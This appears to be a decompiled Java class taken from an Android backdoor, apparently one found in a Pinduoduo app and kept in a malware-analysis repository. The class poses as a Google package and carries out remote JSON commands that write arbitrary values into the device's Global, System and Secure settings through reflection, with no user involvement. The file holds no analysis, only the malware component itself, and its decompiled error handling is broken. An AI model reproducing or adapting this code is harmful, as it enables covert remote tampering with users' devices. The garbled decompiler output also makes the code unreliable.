package com.google.android.sd.biz_dynamic_dex.write_settings;

import android.content.ContentResolver;
import android.content.Context;
import android.provider.Settings;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.Utils;
import org.json.JSONObject;

public class WriteSettingsExecutor extends DynamicCmdExecutor {
  int CMD = 78;
  
  private Class<? extends Settings.NameValueTable> getNameSpace(String paramString) throws Exception {
    paramString.hashCode();
    int i = paramString.hashCode();
    byte b = -1;
    switch (i) {
      case 2135814083:
        if (!paramString.equals("Global"))
          break; 
        b = 2;
        break;
      case -1803461041:
        if (!paramString.equals("System"))
          break; 
        b = 1;
        break;
      case -1822406761:
        if (!paramString.equals("Secure"))
          break; 
        b = 0;
        break;
    } 
    switch (b) {
      default:
        throw new Exception("invaliod namespace");
      case 2:
        return (Class)Settings.Global.class;
      case 1:
        return (Class)Settings.System.class;
      case 0:
        break;
    } 
    return (Class)Settings.Secure.class;
  }
  
  private Object writeSettings(Context paramContext, String paramString1, String paramString2, String paramString3, String paramString4) throws Exception {
    Class<? extends Settings.NameValueTable> clazz = getNameSpace(paramString1);
    paramString2.hashCode();
    int i = paramString2.hashCode();
    byte b = -1;
    switch (i) {
      case 1773932685:
        if (!paramString2.equals("putFloat"))
          break; 
        b = 3;
        break;
      case -219689429:
        if (!paramString2.equals("putLong"))
          break; 
        b = 2;
        break;
      case -462997504:
        if (!paramString2.equals("putString"))
          break; 
        b = 1;
        break;
      case -976920992:
        if (!paramString2.equals("putInt"))
          break; 
        b = 0;
        break;
    } 
    switch (b) {
      default:
        throw new Exception("invalid method name");
      case 3:
        return clazz.getDeclaredMethod(paramString2, new Class[] { ContentResolver.class, String.class, float.class }).invoke(clazz, new Object[] { paramContext.getContentResolver(), paramString3, Float.valueOf(Float.parseFloat(paramString4)) });
      case 2:
        return clazz.getDeclaredMethod(paramString2, new Class[] { ContentResolver.class, String.class, long.class }).invoke(clazz, new Object[] { paramContext.getContentResolver(), paramString3, Long.valueOf(Long.parseLong(paramString4)) });
      case 1:
        return clazz.getDeclaredMethod(paramString2, new Class[] { ContentResolver.class, String.class, String.class }).invoke(clazz, new Object[] { paramContext.getContentResolver(), paramString3, paramString4 });
      case 0:
        break;
    } 
    return clazz.getDeclaredMethod(paramString2, new Class[] { ContentResolver.class, String.class, int.class }).invoke(clazz, new Object[] { paramContext.getContentResolver(), paramString3, Integer.valueOf(Integer.parseInt(paramString4)) });
  }
  
  protected void realExecute(Context paramContext, String paramString) throws Exception {
    JSONObject jSONObject = new JSONObject(paramString);
    paramString = jSONObject.optString("uuid");
    CmdData cmdData = new CmdData(this.CMD, paramString, "client");
    try {
      String str2 = jSONObject.optString("namespace");
      String str3 = jSONObject.optString("method");
      String str4 = jSONObject.optString("name");
      String str1 = jSONObject.optString("value");
      if (!TextUtils.isEmpty(str2) && !TextUtils.isEmpty(str3) && !TextUtils.isEmpty(str4)) {
        Object object = writeSettings(paramContext, str2, str3, str4, str1);
        if (TextUtils.equals(Boolean.TRUE.toString(), String.valueOf(object)))
          return; 
        throw new Exception("write failed");
      } 
      throw new Exception("invalid input");
    } finally {
      jSONObject = null;
      CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(cmdData, jSONObject.getMessage(), null));
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\6afc90e406bf46e4a29956aabcdfe004-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\write_settings\WriteSettingsExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */